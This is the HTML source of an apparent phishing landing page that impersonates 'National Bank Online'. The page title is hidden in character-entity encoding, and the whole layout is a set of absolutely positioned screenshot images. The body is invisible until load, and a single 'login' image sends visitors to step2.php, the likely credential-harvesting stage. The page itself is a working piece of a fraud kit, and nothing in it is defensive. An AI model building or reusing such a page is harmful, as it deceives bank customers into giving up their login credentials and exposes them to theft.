<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#78;&#97;&#116;&#105;&#111;&#110;&#97;&#108;&#32;&#66;&#97;&#110;&#107;&#32;&#79;&#110;&#108;&#105;&#110;&#101;</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
<style type="text/css">
div#container
{
	position:relative;
	width: 1349px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>

<body style="visibility:hidden" onload="unhideBody()"  bgColor="#F0F0F0">
<div id="container">
<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1349px; height:126px; z-index:0"><img src="images/nb1.png" alt="" title="" border=0 width=1349 height=126></div>

<div id="image3" style="position:absolute; overflow:hidden; left:0px; top:122px; width:1349px; height:137px; z-index:1"><img src="images/nb2.png" alt="" title="" border=0 width=1349 height=137></div>

<div id="image1" style="position:absolute; overflow:hidden; left:265px; top:62px; width:249px; height:43px; z-index:2"><a href="#"><img src="images/logo.png" alt="" title="" border=0 width=249 height=43></a></div>

<div id="image4" style="position:absolute; overflow:hidden; left:261px; top:126px; width:832px; height:68px; z-index:3"><a href="#"><img src="images/nb14.png" alt="" title="" border=0 width=832 height=68></a></div>

<div id="image5" style="position:absolute; overflow:hidden; left:263px; top:204px; width:802px; height:151px; z-index:4"><img src="images/nb3.png" alt="" title="" border=0 width=802 height=151></div>

<div id="image6" style="position:absolute; overflow:hidden; left:456px; top:354px; width:612px; height:225px; z-index:5"><a href="#"><img src="images/nb4.png" alt="" title="" border=0 width=612 height=225></a></div>

<div id="image7" style="position:absolute; overflow:hidden; left:454px; top:578px; width:611px; height:224px; z-index:6"><a href="#"><img src="images/nb5.png" alt="" title="" border=0 width=611 height=224></a></div>

<div id="image8" style="position:absolute; overflow:hidden; left:258px; top:354px; width:193px; height:503px; z-index:7"><a href="#"><img src="images/nb6.png" alt="" title="" border=0 width=193 height=503></a></div>

<div id="image9" style="position:absolute; overflow:hidden; left:257px; top:856px; width:193px; height:358px; z-index:8"><a href="#"><img src="images/nb7.png" alt="" title="" border=0 width=193 height=358></a></div>

<div id="image10" style="position:absolute; overflow:hidden; left:451px; top:807px; width:305px; height:179px; z-index:9"><a href="#"><img src="images/nb8.png" alt="" title="" border=0 width=305 height=179></a></div>

<div id="image11" style="position:absolute; overflow:hidden; left:0px; top:1269px; width:1349px; height:173px; z-index:10"><img src="images/nb9.png" alt="" title="" border=0 width=1349 height=173></div>

<div id="image12" style="position:absolute; overflow:hidden; left:0px; top:1442px; width:1348px; height:179px; z-index:11"><img src="images/nb10.png" alt="" title="" border=0 width=1348 height=179></div>

<div id="image13" style="position:absolute; overflow:hidden; left:0px; top:1618px; width:1349px; height:136px; z-index:12"><img src="images/nb11.png" alt="" title="" border=0 width=1349 height=136></div>

<div id="image14" style="position:absolute; overflow:hidden; left:284px; top:1343px; width:489px; height:152px; z-index:13"><a href="#"><img src="images/nb12.png" alt="" title="" border=0 width=489 height=152></a></div>

<div id="image15" style="position:absolute; overflow:hidden; left:831px; top:1342px; width:181px; height:241px; z-index:14"><a href="#"><img src="images/nb13.png" alt="" title="" border=0 width=181 height=241></a></div>

<div id="image16" style="position:absolute; overflow:hidden; left:673px; top:7px; width:411px; height:29px; z-index:15"><a href="#"><img src="images/nb.png" alt="" title="" border=0 width=411 height=29></a></div>

<div id="image17" style="position:absolute; overflow:hidden; left:328px; top:293px; width:55px; height:32px; z-index:16"><a href="step2.php"><img src="images/login.png" alt="" title="" border=0 width=55 height=32></a></div>

</div>

</body>
</html>
